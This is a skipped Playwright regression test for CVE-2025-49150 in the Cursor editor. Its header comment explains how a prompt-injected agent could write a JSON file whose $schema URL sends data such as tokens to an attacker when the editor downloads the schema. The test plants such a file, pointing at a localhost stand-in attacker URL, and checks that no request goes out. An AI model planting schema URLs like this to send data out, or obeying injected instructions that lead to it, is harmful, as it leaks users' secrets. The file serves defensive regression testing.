/**
 * CVE-2025-49150 — json.schemaDownload silent data exfiltration
 *
 * Source:   https://nvd.nist.gov/vuln/detail/CVE-2025-49150
 * CVSS:     5.9 MEDIUM (GitHub CNA GHSA-9h3v-h59j-v6rj; NVD assessment not yet provided)
 * Affected: Cursor < 0.51.0
 * Fixed in: 0.51.0 (https://cursor.com/changelog)
 * Mechanism: The json.schemaDownload.enable setting was true by default. Because the
 *   agent can create and edit JSON files, a prompt-injected agent could write a JSON
 *   document whose $schema field references an attacker-controlled URL. Cursor's editor
 *   would then issue an unauthenticated HTTP GET to that URL — potentially exfiltrating
 *   data embedded in URL parameters (environment values, file paths, tokens read by
 *   the agent in the same session).
 *
 * This is a regression baseline, not a discovery. It runs against the
 * latest Cursor build to confirm the patch holds.
 *
 * Status: skipped during build sprint. Un-skip to run.
 */
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";

import { expect } from "@playwright/test";

import { test } from "../../harness/electron/fixtures/cursor-app.js";
import { recordCursorTraffic } from "../../harness/observers/mitm-record.js";

test.skip(
  "CVE-2025-49150: json.schemaDownload triggers outbound request to attacker-controlled URL",
  async ({ firstWindow: _ }) => {
    const workspaceDir = await fs.mkdtemp(
      path.join(os.tmpdir(), "cursor-cve-49150-")
    );
    const flowPath = path.join(workspaceDir, "mitm-flows.bin");
    const exfilMarker = "cursor-pqe-exfil-probe-49150";
    const attackerSchemaUrl = `http://localhost:9999/schema?token=${exfilMarker}`;

    // Start mitmdump to capture any outbound requests.
    const mitm = await recordCursorTraffic(flowPath);

    try {
      // Write a JSON file with an attacker-controlled $schema URL into the workspace.
      await fs.writeFile(
        path.join(workspaceDir, "payload.json"),
        JSON.stringify({ $schema: attackerSchemaUrl, name: "test" }),
        "utf8"
      );

      // Give Cursor a moment to detect and process the new JSON file.
      await new Promise((r) => setTimeout(r, 3000));

      // Read the captured flows and check for our marker in any request URLs.
      const flowData = await fs
        .readFile(flowPath, "utf8")
        .catch(() => "");
      expect(
        flowData,
        "Cursor issued outbound schema-download request (CVE-2025-49150 regression)"
      ).not.toContain(exfilMarker);
    } finally {
      await mitm.stop();
      await fs.rm(workspaceDir, { recursive: true, force: true });
    }
  }
);
